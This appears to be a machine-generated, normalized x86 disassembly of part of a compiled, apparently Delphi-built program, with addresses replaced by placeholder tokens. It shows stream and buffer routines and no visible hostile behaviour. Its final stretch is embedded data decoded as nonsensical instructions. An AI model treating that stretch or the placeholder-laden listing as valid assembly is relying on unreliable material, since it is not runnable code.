xor ebx ebx
mov [ ebp - 0x1c ] ebx
mov [ ebp - 0x4 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467968
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x4 ] 0x0
jle r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46796f
lea eax [ ebp - 0x1c ]
call sub_404074
retn
test esi esi
je r-xdata
mov cl 0x1
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x54 ]
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ ebx + 0xb0 ]
test eax eax
sete dl
or dl [ ebp + 0x8 ]
je r-xdata
mov edx esi
mov ecx [ ebp - 0x4 ]
call sub_4160e0
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov esi [ ebx + 0xb4 ]
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
push 0x0
push 0x0
mov dl 0x1
mov eax [ r-xdata ]
call sub_467d9c
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4678e9
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx esi
mov ecx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
call sub_4160e0
cmp [ ebx + 0x78 ] 0x0
je r-xdata
pop edx
pop eax
jg r-xdata
cmp eax [ esp ]
pop edx
pop eax
ja r-xdata
mov [ ebp - 0xc ] 0x1
push 0x0
push 0x0
mov eax [ ebp - 0x8 ]
call sub_415e9c
mov eax [ ebx + 0x78 ]
mov edx [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x4c ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
test esi esi
jle r-xdata
jmp r-xdata
mov ecx esi
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x34 ]
add [ ebp - 0xc ] esi
mov eax [ ebp - 0xc ]
cmp eax [ ebp - 0x4 ]
jle r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x5c ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x6c ]
mov edx eax
mov eax [ rw-data ]
mov eax [ eax ]
call sub_461788
mov edx esi
mov eax ebx
call sub_467cf4
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx [ ebp - 0xc ]
inc ecx
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov edx [ ebp - 0xc ]
lea edx [ eax + edx - 0x1 ]
mov eax [ ebx + 0x7c ]
mov esi [ eax ]
call [ esi + 0x58 ]
mov esi eax
xor ecx ecx
xor edx edx
mov eax [ r-xdata ]
call sub_4639e8
test esi esi
sete al
mov [ ebx + 0x69 ] al
xor ecx ecx
mov dl 0x1
mov eax ebx
mov edi [ eax ]
call [ edi + 0x48 ]
push 0x2
mov [ ebp - 0x18 ] 0x274a
mov [ ebp - 0x14 ] 0x2745
mov [ ebp - 0x10 ] 0x2746
lea ecx [ ebp - 0x18 ]
mov eax [ rw-data ]
mov eax [ eax ]
mov edx esi
call sub_4616d4
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
lea eax [ ebp - 0x8 ]
call sub_40d01c
retn
sub_467978
push ebp
mov ebp esp
add esp 0xffffffe8
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0xc ] ebx
mov [ ebp - 0x10 ] ebx
mov ebx ecx
mov esi edx
mov edi eax
xor eax eax
push ebp
push sub_467a9a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax esi
call sub_408534
test al al
je r-xdata
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405ba4
mov eax [ ebp - 0x10 ]
push eax
mov [ ebp - 0x18 ] esi
mov [ ebp - 0x14 ] 0xb
lea edx [ ebp - 0x18 ]
xor ecx ecx
pop eax
call sub_408dbc
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
push 0x20
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_416330
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_467a3d
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
push 0x0
mov cl 0x1
mov edx [ ebp - 0x8 ]
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x80 ]
mov eax [ ebp - 0x8 ]
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x8 ]
call sub_4032a0
retn
cmp [ edi + 0x78 ] 0x0
jne r-xdata
test bl bl
je r-xdata
cmp [ edi + 0xac ] 0x0
je r-xdata
mov ebx [ rw-data ]
mov ebx [ ebx ]
mov eax [ edi + 0xac ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0xc ]
mov edx esi
call ebx
mov [ ebp - 0x4 ] eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467aa1
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_404098
retn
sub_467aac
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
test cl cl
je r-xdata
push 0x0
lea edx [ esp + 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_467768
pop edx
pop ebx
retn
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ esp ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
mov [ esp ] eax
sub_467ae0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467b28
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x4 ]
mov ecx r-xdata
mov edx esi
call sub_404380
mov edx [ ebp - 0x4 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x78 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467b2f
lea eax [ ebp - 0x4 ]
call sub_404074
retn
sub_467b37
inc [ edx ]
add [ eax ] al
add [ 0x5500000a ] cl
mov ebp esp
add esp 0xffffffec
push ebx
push esi
xor ebx ebx
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x5 ] cl
mov esi edx
mov [ ebp - 0x4 ] eax
mov ebx [ ebp + 0x8 ]
xor eax eax
push ebp
push sub_467cb6
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0x5 ] 0x0
je r-xdata
test ebx ebx
jne r-xdata
push 0x0
push 0x0
mov eax esi
call sub_415e9c
mov eax esi
call sub_415e7c
add ebx eax
mov [ ebp - 0x10 ] ebx
mov eax esi
mov edx [ eax ]
call [ edx ]
mov [ ebp - 0x10 ] eax
jmp r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0x30 ]
xor eax eax
push ebp
push sub_467c99
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_467c7a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xa8 ]
mov eax [ ebp - 0xc ]
mov ecx [ eax ]
call [ ecx + 0x4 ]
mov cl 0x1
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_467aac
mov eax esi
call sub_415e7c
mov ebx [ ebp - 0x10 ]
sub ebx eax
cmp [ ebp + 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c81
lea eax [ ebp - 0xc ]
call sub_40d01c
retn
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax esi
mov ebx [ eax ]
call [ ebx + 0xc ]
mov ebx eax
test ebx ebx
jne r-xdata
push 0x0
mov eax [ ebp - 0xc ]
mov edx [ eax + 0x4 ]
mov ecx ebx
mov eax [ ebp - 0x4 ]
call sub_467768
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
mov eax esi
call sub_415e7c
push eax
mov eax [ ebp - 0x10 ]
pop edx
sub eax edx
mov edx [ ebp - 0x4 ]
mov edx [ edx + 0xa8 ]
call sub_463128
mov ebx eax
test ebx ebx
je r-xdata
sub_467cc8
push ebx
mov ebx eax
cmp [ ebx + 0x7c ] 0x0
je r-xdata
pop ebx
retn
mov [ ebx + 0x69 ] 0x1
test [ ebx + 0x1c ] 0x10
jne r-xdata
mov eax [ ebx + 0x78 ]
test eax eax
je r-xdata
mov eax [ ebx + 0x7c ]
mov edx [ eax ]
call [ edx + 0x40 ]
mov edx [ eax ]
call [ edx + 0x44 ]
sub_467cf4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
cmp edx 0x0
jne r-xdata
jle r-xdata
cmp eax 0x0
jbe r-xdata
pop esi
pop ebx
retn
cmp esi 0xffffffff
je r-xdata
jmp r-xdata
push 0x1
mov esi [ ebx + 0xb0 ]
mov eax esi
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ esi + 0x4 ]
mov eax ebx
call sub_467768
mov eax ebx
call sub_467d80
jmp r-xdata
mov eax [ ebx + 0xb0 ]
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
push 0x1
mov eax [ ebx + 0xb0 ]
mov edx [ eax + 0x4 ]
mov ecx esi
mov eax ebx
call sub_467768
mov edx esi
mov eax [ ebx + 0xb0 ]
mov ecx [ eax ]
call [ ecx + 0x24 ]
jmp r-xdata
sub_467d9c
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_403270
mov eax [ ebp + 0x8 ]
mov [ esi + 0x18 ] eax
mov eax [ ebp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_467de4
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467e6a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax edi
mov ecx esi
mov edx [ ebx + 0x4 ]
call sub_404164
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467e71
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub_467e78
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_467f4d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
sub ecx esi
mov edi [ ebx + 0x4 ]
mov edx edi
lea eax [ edi + esi ]
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
sub [ esp ] eax
sbb [ esp + 0x4 ] edx
pop eax
pop edx
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
mov eax ebx
call sub_41658c
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467f54
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
sub_467f5c
push ebp
mov ebp esp
add esp 0xfffffff8
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
cmp eax 0xffffffff
jle r-xdata
mov eax esi
pop edi
pop esi
pop ecx
pop ecx
pop ebp
retn 0x4
xor ecx ecx
mov edx eax
test edx edx
jl r-xdata
test cl cl
jne r-xdata
inc edx
mov eax [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x64 ]
add eax 0x2
dec edx
jne r-xdata
mov cl 0x1
jmp r-xdata
cmp si [ eax ]
jne r-xdata
sub_467fa8
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4680d0
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_403270
mov [ ebp - 0x8 ] eax
xor eax eax
push ebp
push sub_4680a6
push [ fs : eax ]
mov [ fs : eax ] esp
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_4675dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404334
cmp eax 0x3
jle r-xdata
mov eax [ ebx + 0x80 ]
mov edx [ ebp - 0x8 ]
call sub_4650a8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4680ad
lea eax [ ebp - 0x8 ]
call sub_40d01c
retn
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x3 ] 0x2d
jne r-xdata
lea eax [ ebp - 0x10 ]
push eax
mov ecx 0x3
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404594
mov edx [ ebp - 0x10 ]
lea eax [ ebp - 0xc ]
mov ecx r-xdata
call sub_404380
lea eax [ ebp - 0x14 ]
push eax
mov ecx 0x4
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_404594
mov eax [ ebp - 0x14 ]
mov edx [ ebp - 0xc ]
call sub_407f14
test al al
je r-xdata
lea ecx [ ebp - 0x4 ]
mov edx 0x7fffffff
mov eax ebx
call sub_4675dc
mov edx [ ebp - 0x4 ]
mov eax [ ebp - 0x8 ]
mov ecx [ eax ]
call [ ecx + 0x38 ]
mov eax [ ebp - 0x4 ]
call sub_404334
cmp eax 0x4
jl r-xdata
sub_468108
push ebp
mov ebp esp
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
mov eax esi
call sub_467d9c
mov [ esi + 0x20 ] 0x8000
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
pop ebp
retn 0x8
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_468150
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4681dc
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
call sub_4681ec
mov edx eax
mov eax edi
mov ecx esi
call sub_404164
mov edx esi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x24 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4681e3
lea eax [ ebp - 0x4 ]
call sub_404074
retn
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
sub_4681f8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x24 ]
test esi esi
jle r-xdata
pop esi
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx ]
mov ecx eax
mov edx [ ebx + 0x4 ]
mov eax [ ebx + 0x4 ]
add eax esi
call sub_4028c8
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x8 ]
xor eax eax
mov [ ebx + 0x24 ] eax
sub_468230
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_4682e4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
pop edx
pop eax
jle r-xdata
cmp eax [ esp ]
pop edx
pop eax
jbe r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx ]
push edx
push eax
mov eax esi
cdq
cmp edx [ esp + 0x4 ]
jne r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405ba4
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b63c
call sub_403a2c
jmp r-xdata
jmp r-xdata
pop edx
pop eax
jne r-xdata
cmp eax [ esp ]
cmp [ ebx + 0x1a ] 0x0
je r-xdata
add [ ebx + 0x24 ] esi
mov eax [ ebx + 0x24 ]
cmp eax [ ebx + 0x20 ]
jl r-xdata
mov eax ebx
call sub_4680f4
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4682eb
lea eax [ ebp - 0x4 ]
call sub_404074
retn
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x1c ]
call [ ebx + 0x18 ]
mov eax ebx
call sub_4681f8
sub_4682f0
push ebx
push esi
push edi
mov esi ecx
mov edi edx
mov ebx eax
mov eax esi
sub ax 0x1
jae r-xdata
mov ecx esi
mov edx edi
mov eax ebx
call sub_41653c
sub eax [ ebx + 0x24 ]
mov edx [ ebx + 0x24 ]
add edx edi
xor ecx ecx
mov eax ebx
call sub_41653c
sub eax [ ebx + 0x24 ]
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_468328
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46834d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468354
retn
sub_468694
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x5c ]
call sub_403a54
call sub_403aa8
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4686c3
lea eax [ ebp - 0x8 ]
call sub_404074
retn
sub_4686cc
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
or edx 0xffffffff
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x94 ]
xor eax eax
push ebp
push sub_468712
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x44 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468719
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0x58 ]
retn
sub_468720
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_466e68
xor eax eax
mov [ esi + 0xbc ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4035c4
mov eax esi
pop esi
pop ebx
retn
call sub_40361c
pop [ fs : 0x0 ]
add esp 0xc
sub_468760
push ebx
push esi
call sub_40362c
mov ebx edx
mov esi eax
mov edx ebx
and dl 0xfc
mov eax esi
call sub_466f4c
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_403614
sub_4687c8
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4687ed
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4687f4
retn
sub_468890
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_4688b5
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4688bc
retn
sub_4688c9
mov [ esi ] al
add ecx [ ecx ]
push esp
inc esp
popad
je r-xdata
jae r-xdata
dec ebp
outsd
add [ gs : eax ] eax
add [ eax ] al
add [ ecx ] al
add [ eax ] al
add al cl
mov [ esi ] al
or al 0x64
inc ecx
jne r-xdata
hlt
add ah ch
outsd
insd
popad
je r-xdata
mov [ esi ] eax
enter 0x0 0x0
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
add [ eax ] al
arpl [ ecx ] cx
dec ebp
popad
outsb
jne r-xdata
add dh bl
mov [ esi ] eax
in al dx
insb
push es
inc esp
dec ebp
popad
outsb
mov eax eax
or [ ecx + 0xb080046 ] cl
push esp
dec ebp
popad
arpl [ edx + 0x6f ] si
inc ebp
jbe r-xdata
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
push eax
pushfd
inc esi
add [ eax ] bl
inc ebp
inc ecx
add [ eax + 0x3400469c ] dl
inc esp
cld
outsb
je r-xdata
add cl [ eax ]
push es
push ebx
outsb
jb r-xdata
or [ ebx ] al
dec ebp
jae r-xdata
push esp
dec edi
bound ebp [ edx + 0x65 ]
arpl [ eax + ecx + 0x3 ] si
inc ecx
add al ah
pushfd
inc esi
add [ esp + eax * 2 ] dh
or [ ebx + edx * 2 + 0x74 ] dl
jb r-xdata
add [ eax + 0x440046a5 ] ah
movsd [ edi ] [ esi ]
inc ecx
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ eax ] cl
pushfd
inc esi
add [ esi ] cl
add [ eax ] al
add [ eax ] al
add [ ebx ] al
add [ eax ] al
add [ eax + edx + 0x300040 ] dl
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor al 0x0
add [ eax ] al
xchg esp eax
adc [ eax ] al
rol [ eax ] 0x0
add [ edx ] al
add bh ch
outsb
jae r-xdata
sub_468d84
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
pop es
dec edi
outsb
inc ebx
insb
outsd
jae r-xdata
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
add al 0xac
inc esi
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffae5c0041 ] dh
inc esi
add al 0x89
inc esi
add [ eax ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0e0004 ] al
outsb
inc ebp
js r-xdata
xor [ eax ] al
jb r-xdata
add [ ebp + 0x41 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ esi + ebp * 4 + 0x46 ] bl
arpl [ ebp + 0x74 ] si
dec ebp
popad
arpl [ edx + 0x6f ] si
nop
adc al 0x8e
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x72 ] ah
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + ecx * 4 + 0x46 ] al
add [ esi + ecx * 4 + 0x46 ] cl
add [ eax + eax ] cl
add [ eax + 0x54004126 ] dh
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
jbe r-xdata
je r-xdata
rcl [ gs : bp + di ] 0x41
jb r-xdata
add [ ebx ] 0x0
insd
nop
pushad
mov es [ esi ]
pop es
push cs
push esp
inc esp
push ebx
jb r-xdata
inc esp
movsd [ edi ] [ esi ]
inc ecx
nop
jl r-xdata
add [ eax ] al
adc eax [ ecx ]
cmp [ eax ] al
add bh bh
cmp [ eax ] al
add bh bh
add [ eax ] eax
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax 0x6e4f0800
inc ebx
push 0x65676e61
rcl [ ebx ] 0x41
outsd
outsb
jbe r-xdata
add [ edi + ecx * 4 - 0x7033ffba ] ch
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esi + 0x4c00468f ] bh
add [ eax ] al
add bh bh
pushfd
lodsb [ esi ]
inc esi
add [ ecx ] al
rcr [ 0x300041 ] 0x1
add [ 0x656e694c ] al
jae r-xdata
jb r-xdata
add [ eax + 0x54004126 ] dh
test al 0x41
add ah dh
xor al 0x40
add [ eax - 0x3ffbe5f ] ch
xor al 0x40
add al dh
xor al 0x40
add [ eax ] bh
xor al [ eax ]
push esp
xor al [ eax ]
je r-xdata
inc esi
add [ eax + eax ] cl
ror ah 0x8f
js r-xdata
add [ esp + edx * 2 ] al
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0x10046ab ] bh
add bh ch
dec [ eax - 0x52 ]
inc esi
add [ esi ] cl
push esp
inc esp
push ebx
jb r-xdata
test al 0x41
adc [ eax ] al
inc esp
lodsb [ esi ]
inc esi
add [ eax - 0x54 ] dh
inc esi
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x54040003 ] al
add bh bh
inc eax
add [ eax ] al
inc [ ecx ]
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4f0a0006 ] al
add [ esi ] bh
inc ecx
add [ eax + ebp * 4 + 0x41 ] ch
add [ ebp + 0x41 ] dl
add [ ebp + 0x41 ] cl
add [ eax + ebp * 4 + 0x41 ] dh
add [ ebp + edx * 4 + 0xe0046 ] dl
add [ eax ] al
add [ eax ] al
add [ eax ] eax
add [ eax ] al
xchg esp eax
adc [ eax ] al
xor [ eax ] al
add [ eax ] al
pop es
push esp
inc esp
dec ebp
jb r-xdata
inc esi
add [ eax ] bl
inc ebp
inc ecx
add [ esp + 0x41 ] bl
add [ esp + eax * 2 ] dh
inc ecx
add [ 0xffffffffa4000041 ] dh
inc ecx
add [ ebp + 0x41 ] al
xchg esp eax
add al 0x54
add [ eax ] al
add [ eax ] al
add [ eax - 0x80000000 ] al
add eax [ eax ]
je r-xdata
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add dh cl
nop
inc esi
add [ eax ] al
add [ eax ] al
mov al 0x26
inc ecx
add [ eax + ebp * 4 + 0x41 ] dl
pop [ esi ]
lodsb [ esi ]
daa
inc ecx
add [ edx ] al
add [ esi ] al
inc esp
dec ebp
popad
outsb
add [ eax ] al
xor al 0x90
inc esi
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + edx * 4 ] dh
inc esi
add [ eax + eax ] cl
add [ eax ] al
js r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x4c050004 ] al
imul ebp [ esi + 0x65 ] 0x4113c073
add [ eax ] bh
add [ eax ] al
insd
adc al 0x8e
inc esi
add [ edi + 0x70041 ] ch
push es
inc esp
dec ebp
popad
outsb
add eax 0x468d3400
add [ eax + eax ] dh
add bh bh
xor al 0xac
inc esi
